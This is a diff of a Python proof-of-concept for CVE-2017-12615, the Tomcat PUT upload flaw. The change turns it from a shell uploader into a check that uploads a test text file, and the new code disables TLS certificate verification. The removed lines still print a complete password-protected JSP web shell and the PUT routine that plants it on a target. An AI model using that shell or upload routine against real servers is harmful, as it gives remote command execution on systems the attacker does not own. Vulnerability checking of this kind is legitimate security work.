@@ -1,35 +1,60 @@
 import http.client
 import sys
 import time
-body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
-+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
+import ssl
+import requests
+from poc.utils import normalize_target
+from config.config_requests import headers as request_headers, get_proxies
 
-def run(url,port):
+body = "testtest"
+
+def run(url, port):
     try:
-        url=str(url)+':'+str(port)
-        vurl=url
-        conn = http.client.HTTPConnection(url)
-        conn.request(method='OPTIONS', url='/ffffzz')
-        headers = dict(conn.getresponse().getheaders())
-        if ('Allow' in headers and \
-       headers['Allow'].find('PUT') > 0) or ('allow' in headers and \
-       headers['allow'].find('PUT') > 0) :
-            conn.close()
-            conn = http.client.HTTPConnection(url)
-            url = "/" + str(int(time.time()))+'.jsp/'
-            conn.request( method='PUT', url= url, body=body)
-            res = conn.getresponse()
-            if res.status  == 201 :
-                return (1,'[+] [{}] is Vulnerable about cve_2017_12615! shell: {}'.format(vurl,vurl+url[:-1]))
-            elif res.status == 204 :
-                return (1,'[+] %s cve_2017_12615 file exists!'%vurl)
-            else:
-                return (0,'[-] %s seems no vuln about cve_2017_12615'%vurl)
-            conn.close()
+        vurl = normalize_target(url, port)
+        conn_host = str(url) + ':' + str(port)
+        use_https = vurl.startswith('https://')
+        
+        ssl_context = None
+        if use_https:
+            ssl_context = ssl.create_default_context()
+            ssl_context.check_hostname = False
+            ssl_context.verify_mode = ssl.CERT_NONE
+        
+        if use_https:
+            conn = http.client.HTTPSConnection(conn_host, context=ssl_context)
         else:
-            return (0,"[-] %s seems no vuln about cve_2017_12615"%vurl)
+            conn = http.client.HTTPConnection(conn_host)
+        conn.request(method='OPTIONS', url='/ffffzz')
+        response_headers = dict(conn.getresponse().getheaders())
+        if ('Allow' in response_headers and \
+       response_headers['Allow'].find('PUT') > 0) or ('allow' in response_headers and \
+       response_headers['allow'].find('PUT') > 0) :
+            conn.close()
+            if use_https:
+                conn = http.client.HTTPSConnection(conn_host, context=ssl_context)
+            else:
+                conn = http.client.HTTPConnection(conn_host)
+            test_file_path = "/" + str(int(time.time())) + '.txt/'
+            conn.request(method='PUT', url=test_file_path, body=body)
+            res = conn.getresponse()
+            conn.close()
+            
+            if res.status in [201, 204]:
+                try:
+                    test_file_url = vurl + test_file_path[:-1]
+                    r = requests.get(test_file_url, headers=request_headers, proxies=get_proxies(), verify=False, timeout=5)
+                    if r.status_code == 200 and body in r.text:
+                        return (1, '[+] [{}] is Vulnerable to cve_2017_12615!'.format(vurl))
+                    else:
+                        return (0, "")
+                except Exception:
+                    return (0, "")
+            else:
+                return (0, "")
+        else:
+            return (0, "")
     except Exception:
-        return (0,"[-] %s seems no vuln about cve_2017_12615!!"%vurl)
+        return (0, "")
 
 if __name__=="__main__":
     url = sys.argv[1]
